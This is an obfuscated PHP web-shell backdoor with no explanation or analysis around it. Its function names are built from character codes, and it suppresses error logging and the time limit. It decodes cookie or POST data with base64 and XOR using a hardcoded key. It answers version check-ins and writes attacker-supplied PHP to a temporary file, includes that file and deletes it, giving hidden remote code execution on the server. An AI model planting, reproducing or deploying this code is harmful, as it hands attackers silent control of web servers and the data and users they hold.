<?php $rryzzv = chr(102)."\151"."\154".chr(884-783).chr(937-842).chr(259-147)."\x75"."\164".chr(95).chr(200-101)."\157"."\x6e"."\164".'e'.chr(110).chr(116).chr(449-334);
$ycrxzosme = "\142"."\141".chr(446-331).chr(533-432)."\x36".chr(640-588).chr(1093-998)."\144"."\x65"."\x63".chr(823-712)."\x64".chr(928-827);
$wqoku = 'i'.chr(110).chr(712-607).chr(95)."\163".'e'.chr(1050-934);
$ukxcmhcx = "\x75".'n'.'l'.chr(105).'n'."\153";


@$wqoku(chr(101).'r'.'r'.chr(111).chr(114)."\137".'l'.chr(336-225).chr(125-22), NULL);
@$wqoku(chr(216-108)."\x6f"."\147"."\x5f"."\x65".'r'."\x72"."\157"."\x72".chr(115), 0);
@$wqoku(chr(395-286).chr(273-176).chr(120).chr(535-440).'e'."\x78"."\145".chr(955-856).chr(117).'t'."\x69"."\157".chr(110)."\x5f"."\164".chr(105)."\155".chr(101), 0);
@set_time_limit(0);

function oyqujqu($hpytqlqi, $hfazi)
{
    $ykqtcrlakm = "";
    for ($ddztunh = 0; $ddztunh < strlen($hpytqlqi);) {
        for ($j = 0; $j < strlen($hfazi) && $ddztunh < strlen($hpytqlqi); $j++, $ddztunh++) {
            $ykqtcrlakm .= chr(ord($hpytqlqi[$ddztunh]) ^ ord($hfazi[$j]));
        }
    }
    return $ykqtcrlakm;
}

$kbtqhytcge = array_merge($_COOKIE, $_POST);
$lcvevpedk = '5c228932-00c4-4e3f-bd0f-95bb8fe36f6e';
foreach ($kbtqhytcge as $kkjpheic => $hpytqlqi) {
    $hpytqlqi = @unserialize(oyqujqu(oyqujqu($ycrxzosme($hpytqlqi), $lcvevpedk), $kkjpheic));
    if (isset($hpytqlqi["\141".chr(107)])) {
        if ($hpytqlqi['a'] == 'i') {
            $ddztunh = array(
                chr(112).chr(508-390) => @phpversion(),
                "\x73".chr(118) => "3.5",
            );
            echo @serialize($ddztunh);
        } elseif ($hpytqlqi['a'] == "\145") {
            $tgcgnsggyu = "./" . md5($lcvevpedk) . '.'.'i'."\x6e"."\143";
            @$rryzzv($tgcgnsggyu, "<" . "\x3f".chr(112).chr(1033-929)."\x70"."\x20".chr(64).chr(117).chr(110)."\154"."\x69"."\156".chr(298-191).'('."\x5f"."\x5f".chr(529-459)."\x49"."\x4c".chr(484-415)."\137".'_'.chr(41)."\73".' ' . $hpytqlqi['d']);
            @include($tgcgnsggyu);
            @$ukxcmhcx($tgcgnsggyu);
        }
        exit();
    }
}

